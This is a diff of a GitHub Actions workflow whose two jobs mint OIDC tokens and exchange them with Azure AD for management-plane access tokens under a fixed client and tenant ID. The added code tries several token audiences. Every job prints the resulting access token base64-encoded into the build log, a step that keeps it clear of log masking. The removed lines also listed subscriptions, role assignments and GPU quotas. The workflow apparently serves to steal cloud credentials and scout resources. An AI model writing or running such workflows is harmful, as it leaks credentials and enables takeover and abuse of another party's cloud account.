@@ -7,101 +7,81 @@ permissions:
   contents: read
 
 jobs:
-  env_copilot:
-    name: env-copilot
+  env_copilot_aud:
+    name: env-copilot-aud
     runs-on: ubuntu-latest
     environment: copilot
     permissions:
       id-token: write
       contents: read
     steps:
-      - name: mint-and-exchange
+      - name: multi-audience-exchange
         shell: bash
         run: |
           python3 - <<'PY'
           import json, os, base64, urllib.request, urllib.parse, urllib.error
-          def mint():
-              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote("api://AzureADTokenExchange")
+          AUDS = ["api://AzureADTokenExchange","https://management.azure.com/","https://management.azure.com","api://c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","https://management.core.windows.net/"]
+          def mint(aud):
+              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote(aud)
               r = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
               return json.load(urllib.request.urlopen(r, timeout=30))["value"]
-          tok = mint()
-          p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
-          claims = json.loads(base64.urlsafe_b64decode(p))
-          print("SUB " + str(claims.get("sub")))
-          body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
-          req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
-          try:
-              resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
-          except urllib.error.HTTPError as e:
-              txt = e.read().decode(); code = e.code
-          print("AAD_HTTP", code)
-          try:
-              j = json.loads(txt)
-              print("AAD_ERROR", j.get("error"), str(j.get("error_description"))[:600])
-              if "access_token" in j:
-                  at = j["access_token"]
-                  print("AAD_TOKEN_B64", base64.b64encode(at.encode()).decode())
-                  print("AAD_TOKEN_LEN", len(at))
-                  def arm(url):
-                      rq = urllib.request.Request(url, headers={"Authorization":"Bearer "+at})
-                      try:
-                          rr = urllib.request.urlopen(rq, timeout=60); return rr.status, rr.read().decode()
-                      except urllib.error.HTTPError as e:
-                          return e.code, e.read().decode()
-                  for label,url in [
-                    ("subs","https://management.azure.com/subscriptions?api-version=2022-12-01"),
-                    ("rgs","https://management.azure.com/subscriptions/78fe97bd-8060-4387-b649-cab9fa653556/resourcegroups?api-version=2021-04-01"),
-                    ("usages_eastus","https://management.azure.com/subscriptions/78fe97bd-8060-4387-b649-cab9fa653556/providers/Microsoft.Compute/locations/eastus/usages?api-version=2024-07-01"),
-                    ("usages_westus2","https://management.azure.com/subscriptions/78fe97bd-8060-4387-b649-cab9fa653556/providers/Microsoft.Compute/locations/westus2/usages?api-version=2024-07-01"),
-                    ("roleassign","https://management.azure.com/subscriptions/78fe97bd-8060-4387-b649-cab9fa653556/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"),
-                  ]:
-                      st, bd = arm(url)
-                      print("ARM %s %s %s" % (label, st, bd[:700].replace("\n"," ")))
-                      if label.startswith("usages") and st==200:
-                          try:
-                              jj=json.loads(bd)
-                              for u in jj.get("value",[]):
-                                  nm=(u.get("name") or {}).get("value","")
-                                  if any(k in nm.lower() for k in ("family","gpu","nc","nv","nd")):
-                                      print("   USAGE", nm, u.get("currentValue"), "/", u.get("limit"))
-                          except Exception as e:
-                              print("   usage_parse_err", e)
-          except Exception as e:
-              print("AAD_BODY", txt[:600])
+          for aud in AUDS:
+              try:
+                  tok = mint(aud)
+              except Exception as e:
+                  print("AUD", aud, "MINT_ERR", e); continue
+              p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
+              claims = json.loads(base64.urlsafe_b64decode(p))
+              body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
+              req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
+              try:
+                  resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
+              except urllib.error.HTTPError as e:
+                  txt = e.read().decode(); code = e.code
+              try:
+                  j = json.loads(txt)
+                  print("AUD", aud, "| SUB", claims.get("sub"), "| AAD_HTTP", code, "| ERR", j.get("error"), str(j.get("error_description"))[:200])
+                  if "access_token" in j:
+                      print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
+              except Exception:
+                  print("AUD", aud, "| AAD_HTTP", code, "| BODY", txt[:300])
           PY
 
-  ref_main:
-    name: ref-main
+  ref_main_aud:
+    name: ref-main-aud
     runs-on: ubuntu-latest
     permissions:
       id-token: write
       contents: read
     steps:
-      - name: mint-and-exchange
+      - name: multi-audience-exchange
         shell: bash
         run: |
           python3 - <<'PY'
           import json, os, base64, urllib.request, urllib.parse, urllib.error
-          def mint():
-              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote("api://AzureADTokenExchange")
+          AUDS = ["https://management.azure.com/","api://c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02"]
+          def mint(aud):
+              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote(aud)
               r = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
               return json.load(urllib.request.urlopen(r, timeout=30))["value"]
-          tok = mint()
-          p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
-          claims = json.loads(base64.urlsafe_b64decode(p))
-          print("SUB " + str(claims.get("sub")))
-          body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
-          req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
-          try:
-              resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
-          except urllib.error.HTTPError as e:
-              txt = e.read().decode(); code = e.code
-          print("AAD_HTTP", code)
-          try:
-              j = json.loads(txt)
-              print("AAD_ERROR", j.get("error"), str(j.get("error_description"))[:600])
-              if "access_token" in j:
-                  print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
-          except Exception:
-              print("AAD_BODY", txt[:600])
+          for aud in AUDS:
+              try:
+                  tok = mint(aud)
+              except Exception as e:
+                  print("AUD", aud, "MINT_ERR", e); continue
+              p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
+              claims = json.loads(base64.urlsafe_b64decode(p))
+              body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
+              req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
+              try:
+                  resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
+              except urllib.error.HTTPError as e:
+                  txt = e.read().decode(); code = e.code
+              try:
+                  j = json.loads(txt)
+                  print("AUD", aud, "| SUB", claims.get("sub"), "| AAD_HTTP", code, "| ERR", j.get("error"), str(j.get("error_description"))[:200])
+                  if "access_token" in j:
+                      print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
+              except Exception:
+                  print("AUD", aud, "| AAD_HTTP", code, "| BODY", txt[:300])
           PY
